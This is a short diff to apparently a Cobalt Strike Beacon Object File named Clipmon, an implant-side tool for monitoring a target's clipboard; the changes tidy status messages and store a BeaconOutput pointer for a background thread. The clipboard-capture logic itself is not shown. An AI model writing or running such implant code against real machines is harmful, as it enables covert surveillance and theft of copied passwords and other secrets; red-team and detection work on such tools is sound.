@@ -45,7 +45,7 @@ VOID go(
         pSharedData pCheckAddr = GetMemAddr();
         if (pCheckAddr != NULL)
         {
-            BeaconPrintf(CALLBACK_ERROR, "Clipmon is already running");
+            BeaconPrintf(CALLBACK_ERROR, "Clipmon is already running.");
             return;
         }
 
@@ -58,15 +58,16 @@ VOID go(
         pCheckAddr = GetMemAddr();
         if (sd != pCheckAddr)
         {
-            BeaconPrintf(CALLBACK_OUTPUT, "Failed to store shared struct");
+            BeaconPrintf(CALLBACK_OUTPUT, "Failed to store shared struct.");
             memset(sd, 0, sizeof(SharedData));
             free(sd);
             SetMemAddr((pSharedData)0);
             return;
         }
 
-        // Set BeaconPrintf address
+        // Set Beacon func addresses
         sd->pBeaconPrintf = &BeaconPrintf;
+        sd->pBeaconOutput = &BeaconOutput;
 
         // Create event to signal PIC thread to terminate
         sd->hEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
@@ -123,7 +124,7 @@ VOID go(
             return;
         }
 
-        BeaconPrintf(CALLBACK_OUTPUT, "Clipboardmon started!");
+        BeaconPrintf(CALLBACK_OUTPUT, "Clipboardmon started.");
 
         return;
     }
@@ -134,7 +135,7 @@ VOID go(
         pSharedData sd = GetMemAddr();
         if (sd == NULL)
         {
-            BeaconPrintf(CALLBACK_ERROR, "Clipboardmon is not running!");
+            BeaconPrintf(CALLBACK_ERROR, "Clipboardmon is not running.");
             return;
         }
 
@@ -160,7 +161,7 @@ VOID go(
         // Delete atoms
         SetMemAddr((pSharedData)0);
 
-        BeaconPrintf(CALLBACK_OUTPUT, "Clipboardmon stopped!");
+        BeaconPrintf(CALLBACK_OUTPUT, "Clipboardmon stopped.");
     }
     else if (strcmp(pMode, "status") == 0)
     {
